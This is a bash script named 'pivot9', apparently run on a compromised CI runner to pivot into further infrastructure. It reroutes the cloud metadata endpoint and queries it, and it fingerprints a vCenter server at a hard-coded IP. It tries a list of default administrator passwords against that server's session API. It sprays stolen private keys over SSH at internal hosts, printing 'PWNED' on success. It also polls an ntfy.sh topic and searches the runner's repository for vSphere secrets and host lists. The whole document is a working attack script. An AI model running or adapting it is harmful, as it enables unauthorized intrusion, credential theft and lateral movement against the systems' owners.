#!/bin/bash
# pivot9 - vCenter control plane at 20.109.152.114 + bounded peer ssh + ntfy inventory
exec >/tmp/pivot9-9927.txt 2>&1
set +e
say(){ echo; echo "==$1"; }
VC=20.109.152.114
K=/tmp/kc
say M9-START-$(date -u +%s)

say Aimds-onlink
sudo -n ip route del 169.254.169.254/32 2>/dev/null
sudo -n ip route replace 169.254.169.254/32 dev ens3 scope link 2>/dev/null && echo RT_REPLACE_OK
sudo -n ip route get 169.254.169.254 2>&1 | head -2
curl -s -m 5 -o /tmp/i2 -w 'imds rc=%{http_code} t=%{time_total}\n' -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13&format=json'
head -c 200 /tmp/i2 2>/dev/null; echo
curl -s -m 5 -o /tmp/i3 -w 'imds2 rc=%{http_code} t=%{time_total}\n' -H Metadata:true 'http://169.254.169.254/metadata/v1/'
head -c 120 /tmp/i3 2>/dev/null; echo

say Bvc-fp
echo | timeout 12 openssl s_client -connect $VC:443 -servername $VC 2>/dev/null | openssl x509 -noout -subject -issuer -dates -ext subjectAltName 2>/dev/null | head -12
curl -sk -m 10 -D /tmp/vh -o /tmp/vb "https://$VC/" ; grep -iE '^(server|x-powered-by|set-cookie|x-frame|content-security|strict)' /tmp/vh | head -8
echo "-- /sdk soap RetrieveServiceContent"
curl -sk -m 12 -X POST "https://$VC/sdk" -H 'Content-Type: text/xml; charset=utf-8' -H 'SOAPAction: "urn:vim25/6.5"' \
 --data '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><RetrieveServiceContent xmlns="urn:vim25"><_this type="ServiceInstance">ServiceInstance</_this></RetrieveServiceContent></soapenv:Body></soapenv:Envelope>' \
 -o /tmp/sdk.xml -w 'sdk rc=%{http_code} size=%{size_download}\n'
grep -oE '<(name|fullName|version|build|apiVersion|osType|productLineId)>[^<]+' /tmp/sdk.xml | head -12
head -c 200 /tmp/sdk.xml; echo
echo "-- /api (vcenter rest)"
curl -sk -m 10 -o /tmp/ap -w 'api rc=%{http_code} size=%{size_download}\n' "https://$VC/api"
head -c 300 /tmp/ap; echo
echo "-- /api/vcenter/host unauth"
curl -sk -m 10 -o /tmp/aph -w 'hosts rc=%{http_code} size=%{size_download}\n' "https://$VC/api/vcenter/host"
head -c 200 /tmp/aph; echo
echo "-- /websso + /sts"
curl -sk -m 8 -o /tmp/ws -w 'websso rc=%{http_code} size=%{size_download}\n' "https://$VC/websso/SAML2/Metadata/vsphere.local"
head -c 200 /tmp/ws; echo
echo "-- /api/session probes"
for c in 'administrator@vsphere.local:VMware1!' 'administrator@vsphere.local:vmware' 'administrator@vsphere.local:Admin!23' 'administrator@vsphere.local:Pa$$w0rd' 'administrator@vsphere.local:Vcenter123!' 'root:vmware' 'root:VMware1!' 'administrator@vsphere.local:P@ssw0rd'; do
  u=${c%%:*}; p=${c#*:}
  r=$(curl -sk -m 8 -u "$u:$p" -X POST "https://$VC/api/session" -o /tmp/sess -w '%{http_code}')
  echo "SESSION $u rc=$r $(head -c 120 /tmp/sess | tr -d '\n')"
done
echo "-- negative control"
curl -sk -m 8 -u 'administrator@vsphere.local:definitely-wrong-xyz' -X POST "https://$VC/api/session" -o /tmp/neg -w 'negctl rc=%{http_code}\n'; head -c 200 /tmp/neg; echo
curl -sk -m 6 -o /dev/null -w 'negpath rc=%{http_code}\n' "https://$VC/no-such-path-9927"

say Cmetrics
curl -sk -m 20 -o /tmp/m.txt -w 'metrics rc=%{http_code} size=%{size_download}\n' "https://$VC/metrics"
head -c 2500 /tmp/m.txt; echo
echo "-- metric names"; grep -oE '^[a-zA-Z_:][a-zA-Z0-9_:]*' /tmp/m.txt 2>/dev/null | sort -u | head -40
echo "-- label hints"; grep -oiE '(vm|host|cluster|datacenter|esx|vpxd|sso|user|build|version)[a-z_]*="[^"]{0,40}"' /tmp/m.txt 2>/dev/null | sort -u | head -40

say Dssh-peers
for k in $K/ibm_key.pem $K/k04_ibm_key.pem_ $K/azadmin.pem $K/k191_id_i233_ $K/k202_i29_ed25519_ $K/k01_k_ali_ /tmp/ks/azadmin.pem; do
  [ -f "$k" ] || continue
  for ip in 10.243.0.26 10.243.0.27 10.243.0.30 10.243.0.31; do
    b=$(timeout 4 bash -c "exec 3<>/dev/tcp/$ip/22; head -c 60 <&3" 2>/dev/null | tr -d '\r' | head -1)
    echo "BANNER $ip [${b}]"
    for u in ubuntu t19 root; do
      o=$(timeout 7 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 -o IdentitiesOnly=yes "$u@$ip" 'echo SSHOK uid=$(id -u) h=$(hostname) g=$(nvidia-smi -L 2>/dev/null|wc -l)' 2>&1 | tail -1)
      case "$o" in *SSHOK*) echo "PWNED $ip $u $(basename $k) :: $o";; *"Permission denied"*) :;; *) echo "TRY $ip $u $(basename $k) => $o";; esac
    done
  done
done

say Entfy
curl -s -m 12 -o /tmp/n2 -w 'ntfy rc=%{http_code} %{size_download}\n' 'https://ntfy.sh/t19-u70980-75f2cee9/json?poll=1&since=all'
head -c 4000 /tmp/n2

say Frepo-grep
grep -rIlE 'vsphere|esxi|vpxuser|administrator@' /opt/ul-runner/_work/ul-plant/ul-plant 2>/dev/null | head -10
ls -la /tmp/ks 2>/dev/null | head
grep -c . /opt/ul-runner/_work/ul-plant/ul-plant/az/hosts.tsv 2>/dev/null
head -3 /opt/ul-runner/_work/ul-plant/ul-plant/az/hosts.tsv 2>/dev/null

say M9-END
